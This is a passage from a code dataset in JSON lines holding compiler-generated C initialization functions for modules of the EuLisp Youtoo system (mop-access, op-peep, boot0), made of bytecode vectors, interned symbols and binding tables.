,3),I(3c,04,24,00),B(mop_access ,2),I(1c,24,00,00),B(mop_meth ,5),I(3c,02,2a,24),B(mop_access ,2),I(8a,03,02,8a),I(04,24,00,00),B(mop_class ,86),I(24,00,00,00),B(mop_class ,59),I(86,24,00,00),B(mop_class ,32),I(24,00,00,00),B(boot1 ,40),I(3c,05,24,00),B(boot1 ,26),I(3c,00,24,00),B(mop_access ,2),I(8a,04,02,1c),I(1c,24,00,00),B(boot ,8),I(3c,02,1f,04),I(1f,04,23,00),B(mop_access ,48),I(23,00,00,00),B(mop_access ,24),I(3b,04,1f,03),I(24,00,00,00),B(mop_meth ,3),I(3c,04,24,00),B(mop_access ,2),I(1c,24,00,00),B(mop_meth ,5),I(3c,02,2a,24),B(mop_access ,4),I(2a,24,00,00),B(mop_access ,4),I(8a,03,02,8a),I(03,24,00,00),B(mop_class ,57),I(24,00,00,00),B(mop_class ,86),I(86,24,00,00),B(boot1 ,40),I(3c,04,24,00),B(boot1 ,26),I(3c,00,24,00),B(mop_access ,4),I(8a,04,02,1c),I(1c,24,00,00),B(boot ,8),I(3c,02,1f,04),I(1f,04,23,00),B(mop_access ,49),I(23,00,00,00),B(mop_access ,23),I(3b,03,1f,03),I(24,00,00,00),B(mop_meth ,3),I(3c,04,24,00),B(mop_access ,4),I(1c,24,00,00),B(mop_meth ,5),I(3c,02,2a,24),B(mop_access ,9),I(2a,24,00,00),B(mop_access ,9),I(8a,03,02,8a),I(03,24,00,00),B(mop_class ,86),I(24,00,00,00),B(mop_class ,57),I(86,24,00,00),B(boot1 ,40),I(3c,04,24,00),B(boot1 ,26),I(3c,00,24,00),B(mop_access ,9),I(8a,04,02,1c),I(1c,24,00,00),B(boot ,8),I(3c,02,1f,04),I(1f,04,23,00),B(mop_access ,50),I(23,00,00,00),B(mop_access ,22),I(3b,03,1f,03),I(24,00,00,00),B(mop_meth ,3),I(3c,04,24,00),B(mop_access ,9),I(1c,24,00,00),B(mop_meth ,5),I(3c,02,2a,24),B(mop_access ,6),I(2a,24,00,00),B(mop_access ,6),I(8a,03,02,8a),I(04,24,00,00),B(mop_class ,86),I(24,00,00,00),B(mop_class ,57),I(86,24,00,00),B(mop_class ,51),I(24,00,00,00),B(boot1 ,40),I(3c,05,24,00),B(boot1 ,26),I(3c,00,24,00),B(mop_access ,6),I(8a,04,02,1c),I(1c,24,00,00),B(boot ,8),I(3c,02,1f,04),I(1f,04,23,00),B(mop_access ,51),I(23,00,00,00),B(mop_access ,20),I(3b,04,1f,03),I(24,00,00,00),B(mop_meth ,3),I(3c,04,24,00),B(mop_access ,6),I(1c,24,00,00),B(mop_meth ,5),I(3c,02,2a,24),B(mop_access ,6),I(8a,03,02,8a),I(04,24,00,00),B(mop_class ,86),I(24,00,00,00),B(mop_class ,59),I(86,24,00,00),B(mop_class ,32),I(24,00,00,00),B(boot1 ,40),I(3c,05,24,00),B(boot1 ,26),I(3c,00,24,00),B(mop_access ,6),I(8a,04,02,1c),I(1c,24,00,00),B(boot ,8),I(3c,02,1f,04),I(1f,04,23,00),B(mop_access ,51),I(23,00,00,00),B(mop_access ,18),I(3b,04,1f,03),I(24,00,00,00),B(mop_meth ,3),I(3c,04,24,00),B(mop_access ,6),I(1c,24,00,00),B(mop_meth ,5),I(3c,02,2a,24),B(mop_access ,7),I(2a,24,00,00),B(mop_access ,7),I(8a,03,02,8a),I(03,24,00,00),B(mop_class ,57),I(24,00,00,00),B(mop_class ,86),I(86,24,00,00),B(boot1 ,40),I(3c,04,24,00),B(boot1 ,26),I(3c,00,24,00),B(mop_access ,7),I(8a,04,02,1c),I(1c,24,00,00),B(boot ,8),I(3c,02,1f,04),I(1f,04,23,00),B(mop_access ,52),I(23,00,00,00),B(mop_access ,17),I(3b,03,1f,03),I(24,00,00,00),B(mop_meth ,3),I(3c,04,24,00),B(mop_access ,7),I(1c,24,00,00),B(mop_meth ,5),I(3c,02,2a,24),B(mop_access ,13),I(2a,24,00,00),B(mop_access ,13),I(8a,03,02,8a),I(03,24,00,00),B(mop_class ,86),I(24,00,00,00),B(mop_class ,57),I(86,24,00,00),B(boot1 ,40),I(3c,04,24,00),B(boot1 ,26),I(3c,00,24,00),B(mop_access ,13),I(8a,04,02,1c),I(1c,24,00,00),B(boot ,8),I(3c,02,1f,04),I(1f,04,23,00),B(mop_access ,53),I(23,00,00,00),B(mop_access ,16),I(3b,03,1f,03),I(24,00,00,00),B(mop_meth ,3),I(3c,04,24,00),B(mop_access ,13),I(1c,24,00,00),B(mop_meth ,5),I(3d,02,72,45),I(72,00,00,00)};\n\n  /* Byte-vector with size: 3 is_init: 0 index: 55 binding: pprint */\n  static const void *G003025[] = {I(aa,83,1c,24),B(mop_access ,8),I(3d,02,01,00)};\n\n  /* Byte-vector with size: 2 is_init: 0 index: 56 binding: anonymous */\n  static const void *G003027[] = {I(aa,84,02,45),I(00,00,00,00)};\n\n  /* Byte-vector with size: 8 is_init: 0 index: 57 binding: find-slot-names */\n  static const void *G003029[] = {I(aa,04,8a,04),I(02,23,00,00),B(mop_access ,15),I(23,00,00,00),B(mop_access ,56),I(3b,01,1c,24),B(boot ,11),I(3d,02,01,00)};\n\n  eul_allocate_static_string(str_3033, \"\\n  ~a = ~a\", 10);\n  /* Byte-vector with size: 11 is_init: 0 index: 59 binding: anonymous */\n  static const void *G003031[] = {I(aa,1b,84,02),I(1c,82,02,47),I(00,01,1c,3c),I(01,1d,1c,47),I(00,00,23,00),B(mop_access ,58),I(1f,03,1f,03),I(24,00,00,00),B(boot1 ,48),I(3d,04,06,45),I(06,00,00,00)};\n\n  eul_allocate_static_string(str_3036, \"\\nInstance ~a of class #<~a>\", 27);\n  eul_allocate_static_string(str_3037, \"\\n\", 1);\n  /* Byte-vector with size: 32 is_init: 0 index: 62 binding: spprint */\n  static const void *G003034[] = {I(ab,46,02,1c),I(48,00,00,1b),I(48,00,01,47),I(00,01,24,00),B(boot1 ,39),I(3c,01,1b,44),I(53,47,00,01),I(04,1b,82,02),I(47,00,00,23),B(mop_access ,60),I(47,00,01,1f),I(03,24,00,00),B(boot1 ,48),I(3c,04,2a,1c),I(8a,04,02,23),B(mop_access ,15),I(23,00,00,00),B(mop_access ,59),I(3b,01,1c,24),B(boot ,17),I(3c,02,2a,47),I(00,00,23,00),B(mop_access ,61),I(24,00,00,00),B(boot1 ,48),I(3d,02,06,22),I(03,36,11,47),I(00,00,47,00),I(01,24,00,00),B(boot1 ,28),I(3d,02,03,45),I(03,00,00,00)};\n\n  /* Byte-vector with size: 84 is_init: 1 index: 0 binding: initialize-mop-access */\n  static const void *G003038[] = {I(87,25,00,00),B(mop_access ,1),I(24,00,00,00),B(mop_defcl ,1),I(3e,0b,24,00),B(mop_defcl ,0),I(3c,00,21,01),I(24,00,00,00),B(mop_meth ,1),I(3e,0b,24,00),B(mop_meth ,0),I(3c,00,21,01),I(24,00,00,00),B(mop_gf ,1),I(3e,0b,24,00),B(mop_gf ,0),I(3c,00,21,01),I(24,00,00,00),B(mop_inspect ,1),I(3e,0b,24,00),B(mop_inspect ,0),I(3c,00,21,01),I(24,00,00,00),B(mop_class ,1),I(3e,0b,24,00),B(mop_class ,0),I(3c,00,21,01),I(24,00,00,00),B(mop_key ,1),I(3e,0b,24,00),B(mop_key ,0),I(3c,00,21,01),I(24,00,00,00),B(mop_prim ,1),I(3e,0b,24,00),B(mop_prim ,0),I(3c,00,21,01),I(24,00,00,00),B(boot ,1),I(3e,0b,24,00),B(boot ,0),I(3c,00,21,01),I(86,25,00,00),B(mop_access ,13),I(86,25,00,00),B(mop_access ,12),I(86,25,00,00),B(mop_access ,11),I(86,25,00,00),B(mop_access ,10),I(86,25,00,00),B(mop_access ,9),I(23,00,00,00),B(mop_access ,63),I(23,00,00,00),B(mop_access ,62),I(3b,02,25,00),B(mop_access ,8),I(86,25,00,00),B(mop_access ,7),I(86,25,00,00),B(mop_access ,6),I(23,00,00,00),B(mop_access ,64),I(23,00,00,00),B(mop_access ,57),I(3b,01,25,00),B(mop_access ,5),I(86,25,00,00),B(mop_access ,4),I(23,00,00,00),B(mop_access ,65),I(23,00,00,00),B(mop_access ,55),I(3b,01,25,00),B(mop_access ,3),I(86,25,00,00),B(mop_access ,2),I(23,00,00,00),B(mop_access ,66),I(23,00,00,00),B(mop_access ,54),I(3b,00,3d,00),I(00,ac,00,00)};\n\n\n  /* Initializations */\n  eul_allocate_bytevector( G002963,G002962);\n  eul_intern_symbol(sym_2966,\"anonymous\");\n  eul_allocate_bytevector( G002965,G002964);\n  eul_allocate_bytevector( G002968,G002967);\n  eul_allocate_bytevector( G002970,G002969);\n  eul_allocate_bytevector( G002972,G002971);\n  eul_allocate_bytevector( G002974,G002973);\n  eul_allocate_bytevector( G002976,G002975);\n  eul_allocate_bytevector( G002978,G002977);\n  eul_allocate_bytevector( G002980,G002979);\n  eul_allocate_bytevector( G002982,G002981);\n  eul_allocate_bytevector( G002984,G002983);\n  eul_allocate_bytevector( G002986,G002985);\n  eul_allocate_bytevector( G002988,G002987);\n  eul_allocate_bytevector( G002990,G002989);\n  eul_allocate_bytevector( G002992,G002991);\n  eul_allocate_bytevector( G002994,G002993);\n  eul_allocate_bytevector( G002996,G002995);\n  eul_allocate_bytevector( G002998,G002997);\n  eul_allocate_bytevector( G003000,G002999);\n  eul_allocate_bytevector( G003002,G003001);\n  eul_allocate_bytevector( G003004,G003003);\n  eul_intern_symbol(sym_3007,\"compute-and-ensure-slot-accessors\");\n  eul_intern_symbol(sym_3008,\"compute-slot-reader\");\n  eul_intern_symbol(sym_3009,\"compute-slot-writer\");\n  eul_intern_symbol(sym_3010,\"ensure-slot-reader\");\n  eul_intern_symbol(sym_3011,\"compute-primitive-reader-using-slot\");\n  eul_intern_symbol(sym_3012,\"compute-primitive-reader-using-class\");\n  eul_intern_symbol(sym_3013,\"ensure-slot-writer\");\n  eul_intern_symbol(sym_3014,\"compute-primitive-writer-using-slot\");\n  eul_intern_symbol(sym_3015,\"compute-primitive-writer-using-class\");\n  eul_intern_symbol(sym_3016,\"(method compute-and-ensure-slot-accessors)\");\n  eul_intern_symbol(sym_3017,\"(method compute-slot-reader)\");\n  eul_intern_symbol(sym_3018,\"(method compute-slot-writer)\");\n  eul_intern_symbol(sym_3019,\"(method ensure-slot-reader)\");\n  eul_intern_symbol(sym_3020,\"(method compute-primitive-reader-using-slot)\");\n  eul_intern_symbol(sym_3021,\"(method compute-primitive-reader-using-class)\");\n  eul_intern_symbol(sym_3022,\"(method ensure-slot-writer)\");\n  eul_intern_symbol(sym_3023,\"(method compute-primitive-writer-using-slot)\");\n  eul_intern_symbol(sym_3024,\"(method compute-primitive-writer-using-class)\");\n  eul_allocate_bytevector( G003006,G003005);\n  eul_allocate_bytevector( G003026,G003025);\n  eul_allocate_bytevector( G003028,G003027);\n  eul_allocate_bytevector( G003030,G003029);\n  object_class(str_3033) = eul_static_string_class;\n  eul_allocate_bytevector( G003032,G003031);\n  object_class(str_3036) = eul_static_string_class;\n  object_class(str_3037) = eul_static_string_class;\n  eul_allocate_bytevector( G003035,G003034);\n  eul_intern_symbol(sym_3040,\"spprint\");\n  eul_intern_symbol(sym_3041,\"find-slot-names\");\n  eul_intern_symbol(sym_3042,\"pprint\");\n  eul_intern_symbol(sym_3043,\"top-level\");\n  eul_allocate_bytevector( G003039,G003038);\n\n  /* Set local bindings */\n  {\n    int i;\n    for (i = 2; i < 14; i++)\n      mop_access_bindings[i] = eul_nil;\n  }\n\n  mop_access_bindings[ 14] = G002963;\n  mop_access_bindings[ 15] = sym_2966;\n  mop_access_bindings[ 16] = G002965;\n  mop_access_bindings[ 17] = G002968;\n  mop_access_bindings[ 18] = G002970;\n  mop_access_bindings[ 19] = G002972;\n  mop_access_bindings[ 20] = G002974;\n  mop_access_bindings[ 21] = G002976;\n  mop_access_bindings[ 22] = G002978;\n  mop_access_bindings[ 23] = G002980;\n  mop_access_bindings[ 24] = G002982;\n  mop_access_bindings[ 25] = G002984;\n  mop_access_bindings[ 26] = G002986;\n  mop_access_bindings[ 27] = G002988;\n  mop_access_bindings[ 28] = G002990;\n  mop_access_bindings[ 29] = G002992;\n  mop_access_bindings[ 30] = G002994;\n  mop_access_bindings[ 31] = G002996;\n  mop_access_bindings[ 32] = G002998;\n  mop_access_bindings[ 33] = G003000;\n  mop_access_bindings[ 34] = G003002;\n  mop_access_bindings[ 35] = G003004;\n  mop_access_bindings[ 36] = sym_3007;\n  mop_access_bindings[ 37] = sym_3008;\n  mop_access_bindings[ 38] = sym_3009;\n  mop_access_bindings[ 39] = sym_3010;\n  mop_access_bindings[ 40] = sym_3011;\n  mop_access_bindings[ 41] = sym_3012;\n  mop_access_bindings[ 42] = sym_3013;\n  mop_access_bindings[ 43] = sym_3014;\n  mop_access_bindings[ 44] = sym_3015;\n  mop_access_bindings[ 45] = sym_3016;\n  mop_access_bindings[ 46] = sym_3017;\n  mop_access_bindings[ 47] = sym_3018;\n  mop_access_bindings[ 48] = sym_3019;\n  mop_access_bindings[ 49] = sym_3020;\n  mop_access_bindings[ 50] = sym_3021;\n  mop_access_bindings[ 51] = sym_3022;\n  mop_access_bindings[ 52] = sym_3023;\n  mop_access_bindings[ 53] = sym_3024;\n  mop_access_bindings[ 54] = G003006;\n  mop_access_bindings[ 55] = G003026;\n  mop_access_bindings[ 56] = G003028;\n  mop_access_bindings[ 57] = G003030;\n  mop_access_bindings[ 58] = str_3033;\n  mop_access_bindings[ 59] = G003032;\n  mop_access_bindings[ 60] = str_3036;\n  mop_access_bindings[ 61] = str_3037;\n  mop_access_bindings[ 62] = G003035;\n  mop_access_bindings[ 1] = eul_nil;\n  mop_access_bindings[ 63] = sym_3040;\n  mop_access_bindings[ 64] = sym_3041;\n  mop_access_bindings[ 65] = sym_3042;\n  mop_access_bindings[ 66] = sym_3043;\n  eul_allocate_lambda( mop_access_bindings[0], \"initialize-mop-access\", 0, G003039);\n\n  }\n}", "path": "Youtoo\\Telos\\u2\\mop-access.c", "repo_name": "Henry/EuLisp", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 43462}
{"docstring": "/* Initialize module op-peep */\n", "func_signal": "void initialize_module_op_peep()", "code": "{\n  if (is_initialized) return;\n  initialize_module_i_all();\n  eul_fast_table_set(eul_modules,\"op_peep\",(LispRef) op_peep_bindings);\n  is_initialized = 1;\n  {\n  /* Declarations */\n  LispRef sym_5581, sym_5580, sym_5579, sym_5578, sym_5577, sym_5576, G005575, G005573, G005571, G005569, G005567, G005565, G005563, G005561, sym_5559, G005558, G005555, G005553;\n\n  /* Code vector and literal definitions */\n  /* Byte-vector with size: 7 is_init: 0 index: 8 binding: top-level */\n  static const void *G005552[] = {I(a9,24,00,00),B(table1 ,3),I(24,00,00,00),B(mop_gf ,2),I(3c,01,1b,89),B(op_peep ,6),I(45,01,00,00)};\n\n  eul_allocate_static_string(str_5556, \"[~a => ~a]\", 10);\n  /* Byte-vector with size: 40 is_init: 0 index: 10 binding: anonymous */\n  static const void *G005554[] = {I(aa,1b,12,1b),I(44,04,86,36),I(94,1c,10,1b),I(10,1c,73,1d),I(11,1b,73,1f),I(03,47,00,00),I(24,00,00,00),B(op_peep ,7),I(3c,02,1b,44),I(19,1f,03,44),I(12,1b,10,1f),I(04,1c,24,00),B(boot ,5),I(3c,02,22,01),I(36,02,87,36),I(02,86,1b,44),I(51,1c,10,1f),I(03,1c,24,00),B(boot ,5),I(3c,02,1f,08),I(11,1b,11,1b),I(11,1b,10,1f),I(04,1c,23,00),B(op_peep ,9),I(1f,0e,1f,03),I(24,00,00,00),B(i_notify ,4),I(3c,03,2a,47),I(00,00,1c,24),B(list ,3),I(3c,02,1d,1c),I(24,00,00,00),B(boot ,8),I(3c,02,47,00),I(01,1c,90,2a),I(87,22,0a,36),I(0a,1f,08,11),I(47,00,02,3d),I(01,09,22,07),I(45,02,00,00)};\n\n  /* Byte-vector with size: 17 is_init: 0 index: 12 binding: apply-rule */\n  static const void *G005557[] = {I(ab,46,03,1c),I(48,00,00,1b),I(48,00,01,86),I(1b,48,00,02),I(23,00,00,00),B(op_peep ,11),I(23,00,00,00),B(op_peep ,10),I(3b,01,48,00),I(02,47,00,00),I(10,1b,10,24),B(op_peep ,6),I(1c,24,00,00),B(table ,7),I(3c,02,47,00),I(02,3d,01,05),I(45,05,00,00)};\n\n  /* Byte-vector with size: 13 is_init: 0 index: 13 binding: anonymous */\n  static const void *G005560[] = {I(aa,1b,11,12),I(1b,44,06,47),I(00,00,36,27),I(1c,11,1b,1f),I(03,24,00,00),B(op_peep ,2),I(3c,02,1b,44),I(0b,1f,03,47),I(00,01,3d,01),I(04,36,0a,1f),I(03,11,47,00),I(01,3d,01,04),I(22,02,45,02)};\n\n  /* Byte-vector with size: 16 is_init: 0 index: 14 binding: peep-hole-optimize */\n  static const void *G005562[] = {I(aa,46,02,1b),I(48,00,00,86),I(1b,48,00,01),I(23,00,00,00),B(op_peep ,11),I(23,00,00,00),B(op_peep ,13),I(3b,01,48,00),I(01,24,00,00),B(i_param ,51),I(12,1b,44,06),I(47,00,00,36),I(0c,86,47,00),I(00,0f,47,00),I(01,3d,01,03),I(45,03,00,00)};\n\n  /* Byte-vector with size: 20 is_init: 0 index: 15 binding: anonymous */\n  static const void *G005564[] = {I(ab,1c,12,1b),I(44,10,47,00),I(00,11,24,00),B(boot1 ,26),I(3d,01,03,36),I(38,1d,10,1d),I(10,1c,7c,1b),I(44,0f,1f,05),I(11,1f,05,11),I(47,00,01,3d),I(02,06,36,1f),I(1d,1d,24,00),B(compare ,9),I(3c,02,1b,44),I(0f,1f,06,11),I(1f,06,11,47),I(00,01,3d,02),I(07,36,02,86),I(22,01,22,03),I(45,03,00,00)};\n\n  /* Byte-vector with size: 16 is_init: 0 index: 16 binding: match-pattern */\n  static const void *G005566[] = {I(ab,46,02,1b),I(48,00,00,86),I(1b,48,00,01),I(23,00,00,00),B(op_peep ,11),I(23,00,00,00),B(op_peep ,15),I(3b,02,48,00),I(01,1d,10,47),I(00,00,10,50),I(1b,44,10,1f),I(03,11,47,00),I(00,11,47,00),I(01,3d,02,04),I(36,02,86,45),I(04,00,00,00)};\n\n  /* Byte-vector with size: 19 is_init: 0 index: 17 binding: add-rule */\n  static const void *G005568[] = {I(43,04,1f,03),I(72,24,00,00),B(op_peep ,6),I(1c,24,00,00),B(table ,7),I(3c,02,24,00),B(table ,7),I(24,00,00,00),B(boot1 ,42),I(3c,01,1f,06),I(1f,06,1f,06),I(1f,06,24,00),B(boot1 ,26),I(3c,04,1b,1f),I(03,0f,24,00),B(op_peep ,6),I(1f,05,1d,1f),I(05,3c,03,2a),I(1f,08,45,09)};\n\n  /* Byte-vector with size: 22 is_init: 0 index: 18 binding: anonymous */\n  static const void *G005570[] = {I(43,03,1d,12),I(1b,44,0f,1c),I(24,00,00,00),B(boot1 ,26),I(3d,01,04,36),I(42,1d,12,1b),I(44,04,86,36),I(38,1f,04,10),I(1f,04,10,24),B(op_peep ,4),I(3c,02,1b,44),I(25,1f,05,11),I(1f,05,11,1d),I(10,1f,06,1c),I(24,00,00,00),B(boot ,8),I(3c,02,1f,03),I(1f,03,1d,47),I(00,00,3d,03),I(0a,22,04,36),I(02,86,22,01),I(22,01,45,04)};\n\n  /* Byte-vector with size: 10 is_init: 0 index: 19 binding: match-rule */\n  static const void *G005572[] = {I(ab,46,01,86),I(1b,48,00,00),I(23,00,00,00),B(op_peep ,11),I(23,00,00,00),B(op_peep ,18),I(3b,03,48,00),I(00,1d,1d,86),I(47,00,00,3d),I(03,03,45,03)};\n\n  /* Byte-vector with size: 45 is_init: 1 index: 0 binding: initialize-op-peep */\n  static const void *G005574[] = {I(87,25,00,00),B(op_peep ,1),I(24,00,00,00),B(i_all ,1),I(3e,0b,24,00),B(i_all ,0),I(3c,00,21,01),I(23,00,00,00),B(op_peep ,20),I(23,00,00,00),B(op_peep ,19),I(3b,02,25,00),B(op_peep ,7),I(86,25,00,00),B(op_peep ,6),I(23,00,00,00),B(op_peep ,21),I(23,00,00,00),B(op_peep ,17),I(3b,04,25,00),B(op_peep ,5),I(23,00,00,00),B(op_peep ,22),I(23,00,00,00),B(op_peep ,16),I(3b,02,25,00),B(op_peep ,4),I(23,00,00,00),B(op_peep ,23),I(23,00,00,00),B(op_peep ,14),I(3b,01,25,00),B(op_peep ,3),I(23,00,00,00),B(op_peep ,24),I(23,00,00,00),B(op_peep ,12),I(3b,02,25,00),B(op_peep ,2),I(23,00,00,00),B(op_peep ,25),I(23,00,00,00),B(op_peep ,8),I(3b,00,3d,00),I(00,ac,00,00)};\n\n\n  /* Initializations */\n  eul_allocate_bytevector( G005553,G005552);\n  object_class(str_5556) = eul_static_string_class;\n  eul_allocate_bytevector( G005555,G005554);\n  eul_intern_symbol(sym_5559,\"anonymous\");\n  eul_allocate_bytevector( G005558,G005557);\n  eul_allocate_bytevector( G005561,G005560);\n  eul_allocate_bytevector( G005563,G005562);\n  eul_allocate_bytevector( G005565,G005564);\n  eul_allocate_bytevector( G005567,G005566);\n  eul_allocate_bytevector( G005569,G005568);\n  eul_allocate_bytevector( G005571,G005570);\n  eul_allocate_bytevector( G005573,G005572);\n  eul_intern_symbol(sym_5576,\"match-rule\");\n  eul_intern_symbol(sym_5577,\"add-rule\");\n  eul_intern_symbol(sym_5578,\"match-pattern\");\n  eul_intern_symbol(sym_5579,\"peep-hole-optimize\");\n  eul_intern_symbol(sym_5580,\"apply-rule\");\n  eul_intern_symbol(sym_5581,\"top-level\");\n  eul_allocate_bytevector( G005575,G005574);\n\n  /* Set local bindings */\n  {\n    int i;\n    for (i = 2; i < 8; i++)\n      op_peep_bindings[i] = eul_nil;\n  }\n\n  op_peep_bindings[ 8] = G005553;\n  op_peep_bindings[ 9] = str_5556;\n  op_peep_bindings[ 10] = G005555;\n  op_peep_bindings[ 11] = sym_5559;\n  op_peep_bindings[ 12] = G005558;\n  op_peep_bindings[ 13] = G005561;\n  op_peep_bindings[ 14] = G005563;\n  op_peep_bindings[ 15] = G005565;\n  op_peep_bindings[ 16] = G005567;\n  op_peep_bindings[ 17] = G005569;\n  op_peep_bindings[ 18] = G005571;\n  op_peep_bindings[ 19] = G005573;\n  op_peep_bindings[ 1] = eul_nil;\n  op_peep_bindings[ 20] = sym_5576;\n  op_peep_bindings[ 21] = sym_5577;\n  op_peep_bindings[ 22] = sym_5578;\n  op_peep_bindings[ 23] = sym_5579;\n  op_peep_bindings[ 24] = sym_5580;\n  op_peep_bindings[ 25] = sym_5581;\n  eul_allocate_lambda( op_peep_bindings[0], \"initialize-op-peep\", 0, G005575);\n\n  }\n}", "path": "Youtoo\\Comptime2\\u2\\op-peep.c", "repo_name": "Henry/EuLisp", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 43462}
{"docstring": "/* Initialize module boot0 */\n", "func_signal": "void initialize_module_boot0()", "code": "{\n  if (is_initialized) return;\n  initialize_module_level_1();\n  eul_fast_table_set(eul_modules,\"boot0\",(LispRef) boot0_bindings);\n  is_initialized = 1;\n  {\n  /* Declarations */\n  LispRef sym_181, sym_180, sym_179, sym_178, G00177, sym_175, G00174, G00172, sym_170, sym_169, G00168, sym_166, sym_165, G00164, sym_162, G00161, sym_159, sym_158, G00157, sym_155, sym_154, G00153;\n\n  /* Code vector and literal definitions */\n  /* Byte-vector with size: 8 is_init: 0 index: 11 binding: when */\n  static const void *G00152[] = {I(a7,23,00,00),B(boot0 ,9),I(1c,0f,86,86),I(0f,1c,1c,0f),I(1f,04,1c,0f),I(23,00,00,00),B(boot0 ,10),I(1c,0f,45,06)};\n\n  /* Byte-vector with size: 26 is_init: 0 index: 14 binding: cond */\n  static const void *G00156[] = {I(a8,1b,44,61),I(1b,74,1b,44),I(36,1c,10,1b),I(10,1f,03,10),I(1b,11,23,00),B(boot0 ,9),I(1c,0f,1f,06),I(11,23,00,00),B(boot0 ,12),I(1c,0f,1b,86),I(0f,1f,03,1c),I(0f,1f,07,1c),I(0f,23,00,00),B(boot0 ,10),I(1c,0f,22,0a),I(36,23,1c,10),I(1b,10,1f,03),I(11,23,00,00),B(boot0 ,12),I(1c,0f,1b,86),I(0f,1f,03,1c),I(0f,23,00,00),B(boot0 ,13),I(1c,0f,22,06),I(22,01,36,02),I(86,45,01,00)};\n\n  /* Byte-vector with size: 14 is_init: 0 index: 16 binding: and */\n  static const void *G00160[] = {I(a8,1b,44,31),I(1b,11,1b,44),I(26,1c,10,1d),I(11,23,00,00),B(boot0 ,15),I(1c,0f,86,86),I(0f,1c,1c,0f),I(1f,04,1c,0f),I(23,00,00,00),B(boot0 ,10),I(1c,0f,22,06),I(36,03,1c,10),I(22,01,36,02),I(87,45,01,00)};\n\n  /* Byte-vector with size: 8 is_init: 0 index: 19 binding: get-global-register */\n  static const void *G00163[] = {I(aa,86,0f,23),B(boot0 ,17),I(1c,0f,1b,86),I(0f,86,1c,0f),I(23,00,00,00),B(boot0 ,18),I(1c,0f,86,0f),I(45,04,00,00)};\n\n  /* Byte-vector with size: 16 is_init: 0 index: 22 binding: set-global-register */\n  static const void *G00167[] = {I(ab,23,00,00),B(boot0 ,20),I(86,0f,1d,86),I(0f,23,00,00),B(boot0 ,21),I(1c,0f,1f,04),I(86,0f,23,00),B(boot0 ,17),I(1c,0f,1b,86),I(0f,1f,03,1c),I(0f,1f,06,1c),I(0f,23,00,00),B(boot0 ,18),I(1c,0f,1f,09),I(86,0f,0f,45),I(0a,00,00,00)};\n\n  /* Byte-vector with size: 8 is_init: 0 index: 23 binding: unless */\n  static const void *G00171[] = {I(a7,23,00,00),B(boot0 ,9),I(1c,0f,1b,86),I(0f,86,1c,0f),I(1f,04,1c,0f),I(23,00,00,00),B(boot0 ,10),I(1c,0f,45,06)};\n\n  /* Byte-vector with size: 23 is_init: 0 index: 25 binding: or */\n  static const void *G00173[] = {I(a8,1b,44,55),I(1b,11,1b,44),I(4a,24,00,00),B(symbol ,6),I(3c,00,1d,10),I(1b,86,0f,1d),I(1c,0f,1b,86),I(0f,1f,06,11),I(23,00,00,00),B(boot0 ,13),I(1c,0f,1b,86),I(0f,1f,07,1c),I(0f,1f,08,1c),I(0f,23,00,00),B(boot0 ,10),I(1c,0f,1b,86),I(0f,1f,07,1c),I(0f,23,00,00),B(boot0 ,24),I(1c,0f,22,0d),I(36,03,1c,10),I(22,01,36,02),I(86,45,01,00)};\n\n  /* Byte-vector with size: 50 is_init: 1 index: 0 binding: initialize-boot0 */\n  static const void *G00176[] = {I(87,25,00,00),B(boot0 ,1),I(24,00,00,00),B(level_1 ,1),I(3e,0b,24,00),B(level_1 ,0),I(3c,00,21,01),I(23,00,00,00),B(boot0 ,13),I(23,00,00,00),B(boot0 ,25),I(3b,ff,25,00),B(boot0 ,8),I(23,00,00,00),B(boot0 ,26),I(23,00,00,00),B(boot0 ,23),I(3b,fe,25,00),B(boot0 ,7),I(23,00,00,00),B(boot0 ,27),I(23,00,00,00),B(boot0 ,22),I(3b,02,25,00),B(boot0 ,6),I(23,00,00,00),B(boot0 ,28),I(23,00,00,00),B(boot0 ,19),I(3b,01,25,00),B(boot0 ,5),I(23,00,00,00),B(boot0 ,15),I(23,00,00,00),B(boot0 ,16),I(3b,ff,25,00),B(boot0 ,4),I(23,00,00,00),B(boot0 ,12),I(23,00,00,00),B(boot0 ,14),I(3b,ff,25,00),B(boot0 ,3),I(23,00,00,00),B(boot0 ,29),I(23,00,00,00),B(boot0 ,11),I(3b,fe,25,00),B(boot0 ,2),I(86,ac,00,00)};\n\n\n  /* Initializations */\n  eul_intern_symbol(sym_154,\"progn\");\n  eul_intern_symbol(sym_155,\"if\");\n  eul_allocate_bytevector( G00153,G00152);\n  eul_intern_symbol(sym_158,\"cond\");\n  eul_intern_symbol(sym_159,\"or\");\n  eul_allocate_bytevector( G00157,G00156);\n  eul_intern_symbol(sym_162,\"and\");\n  eul_allocate_bytevector( G00161,G00160);\n  eul_intern_symbol(sym_165,\"register-ref\");\n  eul_intern_symbol(sym_166,\"opencoded-lambda\");\n  eul_allocate_bytevector( G00164,G00163);\n  eul_intern_symbol(sym_169,\"x\");\n  eul_intern_symbol(sym_170,\"set-register-ref\");\n  eul_allocate_bytevector( G00168,G00167);\n  eul_allocate_bytevector( G00172,G00171);\n  eul_intern_symbol(sym_175,\"let\");\n  eul_allocate_bytevector( G00174,G00173);\n  eul_intern_symbol(sym_178,\"unless\");\n  eul_intern_symbol(sym_179,\"set-global-register\");\n  eul_intern_symbol(sym_180,\"get-global-register\");\n  eul_intern_symbol(sym_181,\"when\");\n  eul_allocate_bytevector( G00177,G00176);\n\n  /* Set local bindings */\n  {\n    int i;\n    for (i = 2; i < 9; i++)\n      boot0_bindings[i] = eul_nil;\n  }\n\n  boot0_bindings[ 9] = sym_154;\n  boot0_bindings[ 10] = sym_155;\n  boot0_bindings[ 11] = G00153;\n  boot0_bindings[ 12] = sym_158;\n  boot0_bindings[ 13] = sym_159;\n  boot0_bindings[ 14] = G00157;\n  boot0_bindings[ 15] = sym_162;\n  boot0_bindings[ 16] = G00161;\n  boot0_bindings[ 17] = sym_165;\n  boot0_bindings[ 18] = sym_166;\n  boot0_bindings[ 19] = G00164;\n  boot0_bindings[ 20] = sym_169;\n  boot0_bindings[ 21] = sym_170;\n  boot0_bindings[ 22] = G00168;\n  boot0_bindings[ 23] = G00172;\n  boot0_bindings[ 24] = sym_175;\n  boot0_bindings[ 25] = G00174;\n  boot0_bindings[ 1] = eul_nil;\n  boot0_bindings[ 26] = sym_178;\n  boot0_bindings[ 27] = sym_179;\n  boot0_bindings[ 28] = sym_180;\n  boot0_bindings[ 29] = sym_181;\n  eul_allocate_lambda( boot0_bindings[0], \"initialize-boot0\", 0, G00177);\n\n  }\n}", "path": 